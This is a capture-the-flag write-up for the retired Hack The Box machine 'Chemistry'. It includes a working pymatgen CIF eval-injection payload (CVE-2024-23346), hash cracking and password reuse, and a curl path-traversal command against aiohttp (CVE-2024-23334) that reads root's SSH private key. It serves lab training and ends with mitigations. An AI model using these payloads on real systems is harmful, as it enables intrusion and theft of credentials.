---
machine: Chemistry
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, cve, pymatgen, aiohttp, privesc]
---

# Chemistry — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The CIF analyzer uses pymatgen, vulnerable to CVE-2024-23346: an expression in `_space_group_magn.transform_BNS_Pp_abc` reaches `eval` and runs commands when the structure is viewed. Get `app`, crack the SQLite MD5s and `rosa` reuses her password over SSH. An internal panel on 8080 runs aiohttp 3.9.1, vulnerable to CVE-2024-23334; traversal in `/assets/` reads root's private SSH key.

## Recon

```bash
nmap -Pn -sCV -p22,5000 <IP>
```

- `22/tcp` OpenSSH and `5000/tcp` Flask/Werkzeug with a CIF analyzer.
- Registration is open and the panel allows uploading and viewing structures.
- `feroxbuster` finds `/dashboard`, `/upload` and `/logout`.

## Enumeration

- The application uses `pymatgen` to parse CIF and displays structure data.
- The pymatgen version predates the CVE-2024-23346 fix.
- Users are stored in SQLite and hashes are MD5.

## Foothold

Upload a CIF with a malicious expression in `_space_group_magn.transform_BNS_Pp_abc`. Clicking View makes `eval` run it and start a reverse shell as `app`.

```text
_space_group_magn.transform_BNS_Pp_abc 'a,b,[d for d in ().__class__.__mro__[1].__getattribute__(*[().__class__.__mro__[1]]+["__sub" + "classes__"])() if d.__name__ == "BuiltinImporter"][0].load_module("os").system("id");0,0,0'
```

## Lateral movement

`database.db` contains users and MD5 hashes. Several crack; `rosa`'s password also works for the system account and over SSH.

```bash
sqlite3 database.db 'select username,password from users;'
hashcat -m 0 hashes.txt rockyou.txt
```

## Privilege escalation

`rosa` can tunnel to port 8080, where a monitoring panel runs as root with aiohttp 3.9.1. `add_static(..., follow_symlinks=True)` allows `../` in `/assets/` and reads `/root/.ssh/id_rsa`.

```bash
ssh -L 8888:127.0.0.1:8080 rosa@<IP>
curl --path-as-is 'http://localhost:8888/assets/../../../../root/.ssh/id_rsa'
```

## Evidence

- Malicious CIF and `id` execution when viewed.
- Cracked MD5 hashes and SSH as `rosa`.
- Tunnel to 8080 and traversal in `/assets/`.
- Root private key read and root SSH session.

## Lessons learned

- Parsing scientific formats with `eval` turns a file into remote execution.
- Unsalted MD5 hashes fall to dictionary attacks.
- An internal service can be vulnerable even when the main one is patched.

## Mitigation and detection

- Update pymatgen and replace `eval` with a safe parser.
- Use bcrypt/Argon2 and do not reuse application passwords on the system.
- Update aiohttp and avoid serving static files with `follow_symlinks`.

## References

- [0xdf — Chemistry](https://0xdf.gitlab.io/2025/03/08/htb-chemistry.html)
- [IppSec — Chemistry](https://www.youtube.com/watch?v=OH00LkpHyLk)
- [Hack The Box — Chemistry](https://app.hackthebox.com/machines/chemistry)
